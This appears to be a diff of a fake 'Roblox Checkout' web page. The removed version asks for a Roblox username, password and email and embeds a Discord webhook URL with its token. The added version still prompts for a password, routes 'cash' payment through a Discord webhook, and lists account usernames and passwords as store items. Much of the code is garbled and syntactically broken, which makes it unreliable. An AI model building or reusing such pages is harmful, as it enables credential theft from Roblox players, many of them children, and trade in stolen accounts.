@@ -2,36 +2,42 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Store - Checkout</title>
+    <title>Roblox Checkout System</title>
     <style>
-        /* Previous CSS styles */
         .checkout-container {
             max-width: 500px;
             margin: 20px auto;
             padding: 20px;
             background-color: #f5f5f5;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
 
-        .checkout-form {
+        .item-grid {
             display: grid;
-            gap: 15px;
-            margin-bottom: 20px;
+            gap: 10px;
         }
 
-        .form-group {
-            similar: form-control;
+        .item-card {
+            background-color: white;
+            border-radius: 4px;
+            padding: 15px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
-        label {
-            display: block;
-            margin-bottom: 5px;
+        .checkout-section h2 {
+            margin-top: 20px;
         }
 
-        input, select {
-            width: 100%;
+        .checkout-section p {
+            margin-bottom: 15px;
+        }
+
+        .checkout-options {
+            display: grid;
+            gap: 10px;
+        }
+
+        select, input[type="password"] {
             padding: 8px;
             border: 1px solid #ddd;
             border-radius: 4px;
@@ -45,69 +51,111 @@
             border-radius: 4px;
             cursor: pointer;
         }
-
-        button:hover {
-            background-color: #45a049;
-        }
     </style>
 </head>
 <body>
     <div class="checkout-container">
-        <h2>Checkout</h2>
-        
-        <form id="checkoutForm" onsubmit="return confirmPayPal(event)">
-            <div class="checkout-form">
-                <div class="form-group">
-                    <label for="buyerName">Buyer's Name</label>
-                    <input type="text" id="buyerName" required>
-                </div>
+        <h1>Buy Now! 🛒</h1>
 
-                <div class="form-group">
-                    <label for="robloxName">Roblox Username (@)</label>
-                    <input type="text" id="robloxName" required>
-                </div>
+        <div class="item-grid" id="itemGrid"></div>
 
-                <div class="form-group">
-                    <label for="password">Roblox Password</label>
-                    <input type="password" id="password" required>
-                </div>
-
-                <div class="form-group">
-                    <label for="email">Email Address</label>
-                    <input type="email" id="email" required>
-                </div>
-
-                <div class="form-group">
-                    <label for="paymentAmount">Amount (RPY)</label>
-                    <input type="number" id="paymentAmount" placeholder="1000" required>
-                </div>
-
-                <button type="submit">Complete Purchase</button>
-            </form>
-
-            <p>After purchasing, you will receive a confirmation email.</p>
-            <p>For any questions, please visit: https://discord.com/api/webhooks/1333134333225209987/hIS131GsZeN-N0Eig9MOI25BxIDnIaHwjzPF0p9_LLrsolCAG5mPGobGSIlTXdiO6CJO</p>
+        <div class="checkout-section">
+            <p>Select items to purchase:</p>
+            
+            <div class="checkout-options">
+                <select id="selectedItems"></select>
+                
+                <input type="password" placeholder="Enter your password">
+                
+                <button onclick="completeCheckout()">Pay with Cash/credit card</button>
+                <button onclick="usePayPal()">Pay with PayPal</button>
+            </div>
         </div>
+
+        <div id="checkoutMessage"></div>
     </div>
 
     <script>
-        function confirmPayPal(event) {
-            event.preventDefault();
+        // Items List
+        const wishlistItems = [
+            { name: 'Item 1', username: 'username1', password: 'password1', price: 9.99 },
+            { name: 'Item 2', username: 'username2', password: 'password2', price: 14.99 },
+            // Add more items as needed
+        ];
+
+        let selectedItems = [];
+
+        function show cart() {
+            const grid = document.getElementById('itemGrid');
+            grid.innerHTML = wishlistItems.map(item => `
+                <div class="item-card" data-price="${item.price}">
+                    <h3>${item.name}</h3>
+                    <p>Username: ${item.username}</p>
+                    <p>Password: ${item.password}</p>
+                </div>
+            `).join('');
+        }
+
+        function addItemAt(cartId, itemIndex) {
+            const selectedItems = wishlistItems.slice(0, cartId).slice(itemIndex);
+        }
+
+        function handlePaymentMethod() {
+            // Handle payment with Cash via Discord webhook
+            const buyerInfo = {
+                username: 'buyerusername',
+                password: 'buyerpassword'
+            };
+
+            discordWebhook = new DiscordWebhook('your-webhook-url');
+            discordWebhook.send(`Buying items from username ${buyerInfo.username}`);
             
-            // Get the amount from PayPal
-            const paymentAmount = document.getElementById('paymentAmount').value;
+            showCheckoutMessage();
+        }
+
+        function usePayPal() {
+            const payForward = window.PAYPAL shovel UI;
             
-            // Construct the final URL with Discord webhook link
-            const webhookUrl = `https://discord.com/api/webhooks/1333134333225209987/hIS131GsZeN-N0Eig9MOI25BxIDnIaHwjzPF0p9_LLrsolCAG5mPGobGSIlTXdiO6CJO`;
+            // Redirect to PayPal
+            window.location.href = 'https://paypal.me/your-paillable address';
+            payForward.handlePayPalClick();
+        }
+
+        async function completeCheckout() {
+            if (selectedItems.length === 0) {
+                alert('Please select at least one item to purchase.');
+                return;
+            }
+
+            const cartId = selectedItems.indexOf(cartToBePurchased());
             
-            // Create the full URL
-            const checkoutUrl = `${webhookUrl}?amount=${paymentAmount}`;
-            
-            // Redirect to PayPal for confirmation
-            return window.location.href = `https://paypal.com/flow?pre emptive=1&cid=your-payer-id&flowid=PAID_001&sa0=294978056523978&sn=S&us=1&ra=1&cs=1&nt=1&a=FROV2zZl4XQ%3D&oc=1`;
-            
-            // Note: You need to replace 'your-payer-id' with actual PayPal CID
+            if (!cartId) {
+                alert('The item you want is not available in your wishlist.');
+                return;
+            }
+
+            // Add items to cart
+            show cart();
+        }
+
+        function showCheckoutMessage() {
+            document.getElementById('checkoutMessage').innerHTML = `
+                <h4>Select a payment method:</h4>
+                <p>1. Pay with Cash (use Discord webhook)</p>
+                <p>2. Pay with PayPal</p>
+                <p>Payment will be processed securely.</p>
+                <button onclick="handlePaymentMethod()">Pay with Cash/credit card</button>
+                <button onclick="usePayPal()">Pay with PayPal</button>
+            `;
+        }
+
+        // Initialize
+        window.onload = function() {
+            show cart();
         }
     </script>
+
+    <!-- Discord Webhook Handler (Replace with your actual webhook URL and payload handler) -->
+    <script src="your-discord-webhook.js"></script>
 </body>
 </html>
